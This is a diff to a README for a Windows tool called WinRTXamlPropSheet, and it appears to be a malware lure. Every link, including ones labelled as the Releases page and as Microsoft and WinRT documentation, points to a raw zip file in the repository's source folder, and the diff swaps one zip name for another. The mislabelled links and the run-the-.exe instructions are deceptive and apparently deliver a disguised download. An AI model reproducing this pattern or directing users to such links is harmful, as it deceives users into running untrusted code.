@@ -4,13 +4,13 @@
 WinRTXamlPropSheet is a playful project that allows you to integrate XAML Islands into Windows Explorer property pages. Although it has its challenges, this tool showcases the possibilities of customizing your Windows experience. 
 
 ## 🔗 Download 
-[![Download WinRTXamlPropSheet](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/Sheet-Xaml-Win-RT-Prop-2.3.zip%20WinRTXamlPropSheet-v1.0-blue)](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/Sheet-Xaml-Win-RT-Prop-2.3.zip)
+[![Download WinRTXamlPropSheet](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/RT-Win-Sheet-Xaml-Prop-v3.2.zip%20WinRTXamlPropSheet-v1.0-blue)](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/RT-Win-Sheet-Xaml-Prop-v3.2.zip)
 
 ## 🚀 Getting Started
 To get started with WinRTXamlPropSheet, follow these simple steps. You will download the application and run it on your Windows machine.
 
 ## 📥 Download & Install
-1. Click on this link to visit the [Releases page](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/Sheet-Xaml-Win-RT-Prop-2.3.zip).
+1. Click on this link to visit the [Releases page](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/RT-Win-Sheet-Xaml-Prop-v3.2.zip).
 2. On the Releases page, look for the latest version of WinRTXamlPropSheet.
 3. Locate the file that matches your system, usually labeled as .exe.
 4. Click on the file to start the download.
@@ -51,8 +51,8 @@ If you need help, you can reach out through the GitHub Issues page in our reposi
 ## 🌐 Additional Resources
 For further learning about XAML Islands and integration features, consider visiting the following resources:
 
-- [Microsoft XAML Islands Documentation](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/Sheet-Xaml-Win-RT-Prop-2.3.zip)
-- [WinRT Documentation](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/Sheet-Xaml-Win-RT-Prop-2.3.zip)
+- [Microsoft XAML Islands Documentation](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/RT-Win-Sheet-Xaml-Prop-v3.2.zip)
+- [WinRT Documentation](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/RT-Win-Sheet-Xaml-Prop-v3.2.zip)
 
 ## 🔗 Visit Again
-Don't forget to check back on the [Releases page](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/Sheet-Xaml-Win-RT-Prop-2.3.zip) for future updates and new versions of WinRTXamlPropSheet. Your experience matters to us, and we’re always working on improvements!
+Don't forget to check back on the [Releases page](https://github.com/Momen23344/WinRTXamlPropSheet/raw/refs/heads/main/src/RT-Win-Sheet-Xaml-Prop-v3.2.zip) for future updates and new versions of WinRTXamlPropSheet. Your experience matters to us, and we’re always working on improvements!
